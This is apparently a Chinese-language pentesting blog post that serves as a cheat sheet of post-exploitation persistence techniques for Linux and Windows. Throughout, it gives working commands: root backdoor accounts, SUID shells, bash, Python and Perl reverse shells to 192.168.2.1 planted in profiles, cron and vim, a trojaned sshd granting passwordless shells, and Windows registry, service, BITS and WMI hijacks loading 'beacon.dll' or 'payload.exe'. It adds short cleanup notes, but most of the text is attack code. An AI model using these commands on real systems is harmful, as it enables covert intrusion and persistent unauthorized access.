---
title: "authority keep"
permalink: /penetrate/authority-keep/
excerpt: "authority keep"
published: true
related: true
toc: true
toc_sticky: true
redirect_from:
  - /theme-setup/
categories: 
  - pentesting
---  

linux权限维持
添加账号
一般在具有root权限时可以使用以下2种方式添加root权限用户

1.通过useradd，后面账号backdoor/123456

useradd -u 0 -o -g root -G root backdoor

echo 123456:password|chpasswd
2.通过直接对etc/passwd文件进行写入

perl -e 'print crypt("123456", "AA"). "\n"' #首先用perl算一下123456加密后的结果

# 123456加密后的结果为AASwmzPNx.3sg

echo "backdoor:123456:0:0:me:/root:/bin/bash">>/etc/passwd	#直接写入etc/passwd中
清理以上痕迹

userdel -f backdoor
设置sid位的文件
在具有高权限时，将高权限的bash文件拷贝隐藏起来，设置其suid位，则可后面通过低权限用户获取高权限操作

在高权限时

cp /bin/bash /tmp/.bash

chmod 4755 /tmp/.bash  #设置suid
使用时带上-p参数

/tmp/.bash -p
清理痕迹

rm -rf /tmp/.bash
通过环境变量植入后门
以下是环境变量的位置

/etc/profile
/etc/profile.d/*.sh
~/.bash_profile
~/.profile
~/.bashrc
~/bash_logout
/etc/bashrc
/etc/bash.bashrc
写入shell反弹语句

echo 'bash -i >& /dev/tcp/192.168.2.1/7777 0>&1' >> /etc/profile
这样在重启的时候就会弹shell过来了,会根据登的哪个账号弹哪个账号的shell

以下文件需要高权限，为全局变量

/etc/profile
/etc/profile.d/*.sh
/etc/bashrc
/etc/bash.bashrc
以下为当前用户的环境变量

~/.bash_profile		#实验过程中没有反应
~/.profile				#登录后会接收shell，但是加载桌面时会卡住
~/.bashrc					#打开shell窗口时会接收shell，但正常的shell窗口会卡住
~/bash_logout			#实验过程中没有反应
清理痕迹

删除配置文件中添加的代码即可

写入ssh公钥
首先在本地生成ssh公钥和私钥

在自己的~/.ssh/目录下执行

ssh-keygen -t rsa
会生成以下三个文件，id_rsa.pub为公钥，id_rsa为私钥

id_rsa      id_rsa.pub  known_hosts
xxx为公钥内容，也就是id_rsa.pub的内容

echo "xxx" >> ~/.ssh/authorized_keys
清理痕迹

删除目标上的 ~/.ssh/authorized_keys即可

ssh任意密码登录
在root用户时，su，chfn，chsh命令不需要输入密码认证

通过软连接将ssh的服务进行cp，并重命名为以上命令

ln -sf /usr/sbin/sshd /tmp/su				#将sshd做软连接，软连接文件名为su或chfn或chsh
/tmp/su -oPort=12345								#通过软连接的文件，开启ssh连接-oPort指定开启端口
连接

ssh root@host -p 12345

#密码随便输入即可登录,并且可登录任意账号
清理方式

netstat -antp | gerp -E "su|chfn|chsh"
#找到进程号xxx
ps aux | grep xxx
#找到软连接位置/aaa/bbb/su
kill xxx
rm -rf /aaa/bbb/su
修改sshd文件做到无认证登录
建立连接时ssh服务器端使用的是sshd文件来管理接收到的连接，此时对sshd文件内容进行修改，则能做到无认证登录

将原先的sshd文件进行转义

mv /usr/sbin/sshd /usr/bin/sshd
开始使用perl进行写脚本

echo '#!/usr/bin/perl' > /usr/sbin/sshd
echo 'exec "/bin/bash -i" if (getpeername(STDIN) =~ /^..LF/);' >> /usr/sbin/sshd
echo 'exec {"/usr/bin/sshd"} "/usr/sbin/sshd",@ARGV,' >> /usr/sbin/sshd
其实整个脚本在第二行执行了个if，如果端口符合要求，则直接建立连接，否则正常执行sshd

其中的LF代表开启的端口号是19526

python2
>> import struct
>> print struct.pack('>I6',19526) 
#输出的内容为 LF
赋予新文件权限并重启sshd

chmod u+x sshd
service sshd restart
连接方式

socat STDIO TCP4:172.16.177.178:22,bind=:19526
清除痕迹

#删除自定义的sshd
rm -rf /usr/sbin/sshd
#将同版本的sshd拷贝到对应目录下
mv /usr/bin/sshd /usr/sbin/sshd
利用vim可执行python脚本预留后门
先准备个python的反弹shell脚本

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.1",7778));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
找到提供vim插件的python的扩展包目录

vim --version  #查看使用的python版本
找到python的扩展位置

pip show requests
进入目录

cd /usr/lib/python2.7/site-packages
将内容写入

echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.2.1",7778));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > dir.py
运行，并删除文件

$(nohup vim -E -c "pyfile dir.py"> /dev/null 2>&1 &) && sleep 2 && rm -f dir.py
清除痕迹

ps aux|grep vim
#获取pid
kill pid
计划任务
因为计划任务使用的是/bin/sh,所以传统的直接通过bash反弹shell是行不通的

这里借助python，或者perl都可

使用python

echo -e "*/1 * * * * python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.2.1\",7778));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"|crontab -
使用perl

echo -e "*/1 * * * * perl -e 'use Socket;\$i=\"192.168.2.1\";\$p=7778;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"|crontab -
清除痕迹

如果通过crontab -e 不知道为啥会顶掉上一个

crontab -l			#只看得到一个
crontab -r			#删除所有计划任务
动态加载库
使用export LD_PRELOAD=./xx.so

这时候./xx.so中如果对函数进行了重定义，调用了该函数的程序就会执行重定义的代码

这里使用以下项目

https://github.com/Screetsec/Vegile
准备2个文件

msf的木马
Veglie项目
使用方法将MSF木马和Vegile上传到目标服务器上，把项目目录弄成http服务

python -m SimpleHTTP
目标服务器上

wget http://xxx.xxx.xx.xxx:8000/Vegile.zip
wget http://xxx.xxx.xx.xxx:8000/shell
解压后运行

unzip Vegile.zip
chmod 777 Vegile shell
./Vegile --u shell
清理痕迹

清理起来十分麻烦，因为直接删除进程是删不掉的，因此存在父进程与多个子进程

清理思路挂起父进程，清除所有子进程再删除父进程

windows权限维持
比较常见的windows提取
ms14_058 内核模式驱动程序中的漏洞可能允许远程执行代码
ms16_016 WebDAV本地提权漏洞(CVE-2016-0051)
ms16_032 MS16-032 Secondary Logon Handle 本地提权漏漏洞
计划任务
拿到shell后先修改编码

chcp 65001
设置计划任务，每分钟调用运行一次shell

schtasks /create /tn shell /tr C:\payload.exe /sc minute /mo 1 /st 10:30:30 /et 10:50:00
清理痕迹

控制面板->管理工具->任务计划程序->找到恶意计划任务
在 操作 中找到调用的脚本，进行文件删除
删除恶意计划任务
映像劫持
在程序运行前会去读自己是否设置了debug，需要对劫持的程序有权限

以下通过注册表对setch.exe设置了debug为cmd.exe程序，也就是按5下shift会弹出cmd的框

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
清理痕迹

HKLM是HKEY_LOCAL_MACHINE

找到目标的注册表，将debug内容删除

环境变量
用户登陆时会去加载环境变量，通过设置环境变量UserInitMprLogonScript值，实现登陆时自动运行脚本

reg add "HKEY_CURRENT_USER\Environment" /v UserInitMprLogonScript /t REG_SZ /d "C:\Users\Public\Downloads\1.bat" /f
清理痕迹

直接找到 开始->用户头像->更改我的环境变量

进程退出劫持
在注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit下控制程序的退出时执行的动作,但有时候权限很迷

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "c:\payload.exe”
清理痕迹

找到目标的注册表删除即可

AppInit_DLLs注入
User32.dll 被加载到进程时，设置其注册表的中能设置加载其他的dll文件，则可使其加载恶意的脚本

对HKML注册表的内容进行修改一般都要system权限

Windows 10

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Appinit_Dlls /t REG_SZ /d "c:\Users\Public\Downloads\beacon.dll" /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0x1 /f
其他

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v Appinit_Dlls /t REG_SZ /d "c:\Users\Public\Downloads\beacon.dll" /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 0x1 /f

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0x0 /f
这样在打开cmd或者计算器这种能调用User32.dll动态链接库的时候就会触发

清理痕迹

到对应注册表的位置删除Appinit_Dlls的值

bits文件传输
通过bitsadmin从网络上下载的时候可以额外执行脚本

bitsadmin /create test

随意下载
bitsadmin /addfile test http://192.168.2.1:8000/payload.ps1 c:\users\public\downloads\payload.ps1 

执行的命令
bitsadmin /SetNotifyCmdLine test "C:\windows\system32\cmd.exe" "cmd.exe /c c:\users\public\downloads\payload.exe" 

启动任务
bitsadmin /resume test
每次开机的时候会触发

清理痕迹

bitsadmin /reset
COM组件劫持
将脚本放入com组件中

reg add "HKEY_CURRENT_USER\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" /t REG_SZ /d "c:\users\public\downloads\beacon.dll" /f

reg add "HKEY_CURRENT_USER\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f
清理痕迹

删除注册表中的路径值，并通过路径删除木马文件

替换cmd.exe
将sethc.exe（按shift 5下）替换成cmd.exe

takeown /f sethc.* /a /r /d y
cacls sethc.exe /T /E /G administrators:F
copy /y cmd.exe sethc.exe
清理痕迹

找个原版的setch.exe 覆盖回去

Winlogon劫持
winlogon是windows登录账户时会执行的程序，这里将其注册表中写入木马运行的dll路径

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v shell /t REG_SZ /d "explorer.exe, rundll32.exe \"c:\users\public\downloads\beacon.dll\" StartW" /f
清理痕迹

删除注册表的shell中的值，并且找到后门文件删除掉

组策略
需要能远程登录到桌面

输入gpedit.msc打开组策略，需要管理员账号

在用户与计算机中的windows设置中均可以对脚本进行编辑，用户策略是用户权限，计算机策略是system权限

清理痕迹

打开组策略找到脚本，删除即可

修改计算器启动服务调用的程序
启动服务有些需要手动启动，比如IEEtwCollectorService 服务，这里做后面的思路是，该服务本身对计算机运行没有影响，因此将其手动启动改成自动启动，并将其运行的脚本改成木马后门

类比一下windows10 没有IEEtwCollectorService 服务可以选择COMSysApp服务

篡改运行脚本
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IEEtwCollector Service" /v ImagePath /t REG_EXPAND_SZ /d "c:\users\public\downloads\beacon.exe" /f

设置自动启动
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\IEEtwCollector Service" /v Start /t REG_DWORD /d 2 /f 

启动服务
sc start IEEtwCollectorService 
返回的是system权限

清理痕迹

将篡改的注册表改回来，并且删除目标木马

MSDTC 服务
MSDTC 服务默认会加载一个在windowss/system32下的不存在的 oci.dll，思路是将cs.dll 改名为oci.dll，放到system32下即可，该方法需要管理员用户权限

清理痕迹

删除的时候因为被多个进程调用，因此删不掉，这里可以换个思路修改其名称，重启再删除

启动项
启动项是会去指定文件夹下运行文件夹下的所有服务，这个文件夹是

C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

C:\Users\test\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
也会运行以下注册表中的脚本

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "c:\users\public\downloads\payload.exe" /f

需要高权限
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "c:\users\public\downloads\payload.exe" /f
清理痕迹

删除文件夹下的木马或者删除注册表中添加的恶意木马注册表，并找到木马位置删除

cmd 启动劫持
在cmd启动时回去注册表中查看是否有AutoRun的健值，如果有则会运行其中的脚本

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor" /v AutoRun /t REG_SZ /d "c:\users\public\downloads\payload.exe" /f
清理痕迹

在管理员权限下删除注册表的值即可

wmic事件
注册一个事件过滤器，该过滤器是开机 2 分钟到 2 分半钟，由于是永久 WMI 事 件订阅，故需要管理员权限，最终获取到权限也是 system 权限
wmic 
/NAMESPACE:"\\root\subscription"PATH__EventFilterCREATE Name="TestEventFilter", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 20 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=120 AND TargetInstance.SystemUpTime < 150" 


注册一个事件消费者，这里写入了要执行的命令，是用 rundll32 启动 cs 的 dll
wmic /NAMESPACE:"\\root\subscription"PATHCommandLineEventConsumer CREATE Name="TestConsumer2",ExecutablePath="C:\Windows\System32\cmd.exe",CommandLineTemplate=" /c rundll32 c:\users\public\downloads\beacon.dll #5" 

绑定事件 过滤器和事件消费者
wmic /NAMESPACE:"\\root\subscription"PATH__FilterToConsumerBindingCREATE Filter="__EventFilter.Name=\"TestEventFilter\"", Consumer="CommandLineEventConsumer.Name=\"TestConsumer2\""